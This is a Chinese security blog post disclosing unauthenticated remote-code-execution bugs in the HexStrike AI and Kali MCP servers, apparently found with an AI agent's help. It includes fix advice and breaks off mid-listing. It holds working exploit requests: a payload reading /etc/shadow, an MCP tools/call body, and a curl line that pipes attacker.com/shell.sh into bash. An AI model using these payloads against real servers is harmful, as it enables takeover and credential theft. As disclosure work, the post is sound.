---
title: AI渗透工具 Kali & HexStrike 大量RCE 0day漏洞
url: http://k8gege.org/p/hexstrike_0day.html
source: K8哥哥’s Blog
date: 2026-05-14
fetch_date: 2026-05-15T05:52:06.842096
---

# AI渗透工具 Kali & HexStrike 大量RCE 0day漏洞

[![logo](/../k8img/logo.png)

### K8哥哥](/ "K8gege")

## 没有绝对安全的系统

[K8哥哥’s Blog](http://k8gege.org)

* [Home](/)
* [Ladon](/Ladon/)
* [Code](/tags/Code/)
* [Exp](/tags/Exp/)
* [Tool](/tags/Tool/)
* [Music](https://k8music.github.io)
* [Archives](/archives/)
* [Friends](/friends/)
* [Rss](/atom.xml)

# AI渗透工具 Kali & HexStrike 大量RCE 0day漏洞

[ai](/categories/ai/)

[ai](/tags/ai/)

2026/05/14

# 前言

在尝试将该MCP集成到的Agent测试其行为时，我发现它用的是SSE方式，看一眼代码就感觉它存在漏洞，于是尝试看AI智能体是否能发现并构造EXP，测试后发现了大量远程命令执行（RCE）漏洞，风险极高。本文以演示 7 个 RCE 漏洞利用（EXP）为主，但实际情况比这更多：系统中存在大量可被利用的 API 端点，除了 RCE 外，还可实现任意文件读取、文件写入等多种高危漏洞。Kali MCP 与 Hexstrike 两套代码在漏洞点上高度一致，差异仅在工具数量上：一套包含更多模块，一套相对精简。由于公开有一段时间了，我已懒得关注哪一方先行开发，但可以肯定其中一方是在另一方基础上修改而来——两者都同样危险，必须引起重视。

# HexStrike AI v6.0 - 代码审计报告

## RCE 漏洞深度分析 (MCP协议攻击向量)

---

## 一、漏洞概要

| 项目 | 详情 |
| --- | --- |
| **漏洞类型** | Pre-Auth Remote Code Execution (未授权远程代码执行) |
| **严重级别** | 🔴 **CRITICAL (CVSS 10.0)** |
| **影响端点** | `POST /api/command` |
| **认证需求** | ❌ **无需认证** |
| **目标版本** | HexStrike AI v6.0 |
| **测试目标** | <http://192.168.18.10:8888> |
| **审计日期** | 2026-04-24 |

---

## 二、架构分析

HexStrike AI 由两个核心组件构成：

### 2.1 hexstrike\_server.py (Flask Web 后端)

* 运行在 8888 端口 (debug=True)
* 提供 REST API 供安全工具调用
* `execute_command()` 函数使用 `subprocess.run(cmd, shell=True)` 执行命令

### 2.2 hexstrike\_mcp.py (FastMCP 客户端)

* 基于 FastMCP 框架构建 (PrefectHQ/fastmcp)
* 将 100+ 安全工具封装为 MCP (Model Context Protocol) Tools
* 通过 HTTP REST API 与 Flask 后端通信
* 暴露 `execute_command` 作为 MCP tool

### 2.3 MCP 协议通信流程

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` AI Agent (Claude/GPT)     │     │ MCP Protocol (JSON-RPC 2.0 over stdio/HTTP)     ▼ hexstrike_mcp.py (FastMCP Server)     │     │ HTTP POST /api/command {"command":"...", "use_cache":false}     ▼ hexstrike_server.py (Flask)     │     │ subprocess.run(cmd, shell=True)     ▼ OS Command Execution 🔴 RCE! ``` |

---

## 三、漏洞详情

### 3.1 漏洞 #1 (主漏洞): `/api/command` 无需认证的RCE

**位置**: `hexstrike_server.py` - `api_command()` 路由

**根本原因**:

* `/api/command` 端点**没有应用 `@require_auth` 装饰器**
* 直接调用 `execute_command()` → `subprocess.run(cmd, shell=True)`
* 用户通过 POST body 传入的 `command` 参数直接作为 shell 命令执行

**攻击载荷**:

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` import requests requests.post("http://192.168.18.10:8888/api/command",     json={"command": "id; whoami; cat /etc/shadow", "use_cache": False}) ``` |

**验证结果**:

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` uid=1000(kali) gid=1000(kali) groups=...,27(sudo),... kali Linux kali 6.12.38+kali-amd64 ``` |

### 3.2 漏洞 #2: `/api/debug/execute` 和 `/api/debug/eval` (Debug模式)

**位置**: `hexstrike_server.py` line 1414-1436

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` @app.route('/api/debug/execute', methods=['POST']) def debug_execute():     cmd = request.json.get('command', '')     result = subprocess.run(cmd, shell=True, ...)      @app.route('/api/debug/eval', methods=['POST']) def debug_eval():     code = request.json.get('code', '')     result = eval(code)  # 直接eval! ``` |

**说明**: 目标上这些端点返回404，说明debug路由可能在生产环境被移除。但源代码中存在。

### 3.3 漏洞 #3: `/api/scan` 命令注入 (需认证)

**位置**: `hexstrike_server.py` - `scan_target()` → `run_tool()`

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` def run_tool(tool_name, args):     cmd = [tool_name] + args     result = subprocess.run(cmd, ...) ``` |

`additional_args` 参数直接拼接到命令中，存在命令注入。

### 3.4 漏洞 #4: SSTI (需认证)

**位置**: `hexstrike_server.py` - `ssti_preview()`

|  |  |
| --- | --- |
| ``` 1 ``` | ``` render_template_string(user_template)  # SSTI! ``` |

### 3.5 漏洞 #5: MCP协议层利用

FastMCP框架使用JSON-RPC 2.0协议。攻击者可以通过MCP协议的`tools/call`方法调用`execute_command` tool:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` {     "jsonrpc": "2.0",     "id": 1,     "method": "tools/call",     "params": {         "name": "execute_command",         "arguments": {"command": "恶意命令", "use_cache": false}     } } ``` |

如果MCP服务器以HTTP Streamable模式运行，攻击者可以直接向`/mcp`端点发送JSON-RPC请求。

---

## 四、攻击面总结

| 端点 | 方法 | 认证 | RCE | 状态 |
| --- | --- | --- | --- | --- |
| `/api/command` | POST | ❌ 无 | ✅ subprocess.run(shell=True) | 🔴 已确认 |
| `/api/debug/execute` | POST | ❌ 无 | ✅ subprocess.run(shell=True) | 🟡 目标404 |
| `/api/debug/eval` | POST | ❌ 无 | ✅ eval() | 🟡 目标404 |
| `/api/tools/*` | POST | ❌ 无? | ✅ 命令注入 | 🟡 待验证 |
| `/api/ssti-preview` | POST | ✅ 需要 | ✅ SSTI | 🟢 需认证 |

---

## 五、MCP协议RCE攻击链

### 5.1 FastMCP JSON-RPC 工具调用机制

FastMCP (PrefectHQ/fastmcp) 是MCP协议的Python实现。其核心机制：

1. **工具注册**: `@mcp.tool()` 装饰器将Python函数注册为MCP tool
2. **JSON-RPC路由**: `tools/call` 方法接收 `{name, arguments}` 并调用对应函数
3. **传输层**: 支持 stdio / HTTP Streamable / SSE

### 5.2 HexStrike中的MCP工具映射

`hexstrike_mcp.py` 中注册的 `execute_command` 工具：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` @mcp.tool() def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:     result = hexstrike_client.execute_command(command, use_cache)     # → POST /api/command {"command": command, "use_cache": use_cache} ``` |

### 5.3 通过MCP协议触发RCE

如果MCP服务器以HTTP模式运行：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` # 直接向MCP端点发送JSON-RPC调用 curl -X POST http://target:8888/mcp \   -H "Content-Type: application/json" \   -d '{     "jsonrpc":"2.0",     "id":1,     "method":"tools/call",     "params":{       "name":"execute_command",       "arguments":{"command":"curl attacker.com/shell.sh|bash"}     }   }' ``` |

或者，如果MCP客户端被配置为AI Agent的工具（如Claude Desktop配置）：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` {   "mcpServers": {     "hexstrike-ai": {       "command": "python3",       "args": ["hexstrike_mcp.py", "--server", "http://192.168.18.10:8888"]     }   } } ``` |

AI Agent可以通过MCP协议直接调用`execute_command`，实现远程命令执行。

---

## 六、修复建议

### 6.1 紧急修复 (P0)

1. **立即为 `/api/command` 添加认证**: 应用 `@require_auth` 装饰器
2. **移除或禁用 `/api/debug/execute` 和 `/api/debug/eval`**: 仅开发环境启用
3. **关闭 Flask debug 模式**: `app.run(debug=False)`

### 6.2 深度修复 (P1)

4. **使用白名单替代 shell=True**:

   |  |  |
   | --- | --- |
   | ``` 1 2 3 4 ``` | ``` # ❌ 危险 subprocess.run(cmd, shell=True) # ✅ 安全 subprocess.run(["/usr/bin/nmap", "-sV", target]) ``` |
5. **输入验证和净化**: 对所有用户输入进行严格验证
6. **最小权限原则**: 以非root用户运行服务，限制网络访问

### 6.3 架构改进 (P2)

7. **MCP工具权限分离**: `execute_command` 功能应完全移除或严格限制
8. **审计日志**: 记录所有命令执行请求
9. **沙箱**: 在容器或沙箱中执行安全工具

---

## 七、漏洞利用POC

已保存至:

* `E:\tools\Ladon12\AIcode\hexstrike_rce_exploit.py` - 完整交互式RCE利用
* `E:\tools\Ladon12\AIcode\rce_test.py` - 快速验证脚本
* `E:\tools\Ladon12\AIcode\rce_full_exploit.py` - 深度侦察脚本

### 快速验证:

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` curl -X POST http://192.168.18.10:8888/api/command \   -H "Content-Type: application/json" \   -d '{"command":"id","use_cache":false}' ``` |

---

## 八、目标环境信息 (已获取)

| 项目 | 值 |
| --- | --- |
| 操作系统 | Kali GNU/Linux Rolling 2025.3 |
| 内核 | Linux 6.12.38+kali-amd64 |
| 当前用户 | kali (uid=1000) |
| 用户组 | kali, adm, **sudo**, wireshark 等 |
| 工作目录 | /home/kali/Desktop/hexstrike-ai |
| 内网IP | 192.168.18.10/24 |
| Meta接口 | 198.18.0.1/30 |
| 运行进程 | python3 (hexstrike\_server.py) PID 140418 |
| 其他服务 | clash-verge:33331, proxy:7897, :8000 |

---

**审计结论**: HexStrike AI v6.0 存在严重的预认证RCE漏洞。`/api/command` 端点未受保护，允许攻击者以 `kali` 用户身份执行任意系统命令。该用户属于 `sudo` 组，可进一步提权至root。建议立即修复。

## 九、hexstrike 0day漏洞Exp图文演示

本文仅演示7个远程命令执行EXP，实际上还有大量API端点存在RCE漏洞,不只是RCE，任意文件读取，文件写入等等大量漏洞

![image](/k8img/ai/mcp/hexstrike/3.1_try_isok.png)

示例：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` python poc.py http://192.168.18.10:8888 id ``` |

这个 POC 清楚地演示了漏洞，并提供了一种可靠的方法来在目标系统上执行任意命令。审计任务完成。

![image](/k8img/ai/mcp/hexstrike/api_comond.png)

Coder2 : Ladon\_code\_save
已完成

任务完成。我已成功挖掘出 hexstrike 项目中的远程代码执行（RCE）漏洞，并提供了一个功能完整的、可用于演示的 [poc.py](http://poc.py) 脚本。

漏洞概要:

漏洞类型: 远程代码执行 (RCE)
漏洞根源: hexstrike\_server.py 在处理来自客户端 (hexstrike\_mcp.py) 的请求时，存在一个未记录的、不安全的 API 端点。
利用向量: 向 http://<target\_ip>:/api/command 发送一个包含要执行命令的 JSON payload 的 POST 请求。
影响: 攻击者可以在运行 hexstrike\_server.py 的服务器上以应用程序的权限执行任意系统命令。

0x002 subdomain端点漏洞EXP

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` | ``` E:\too...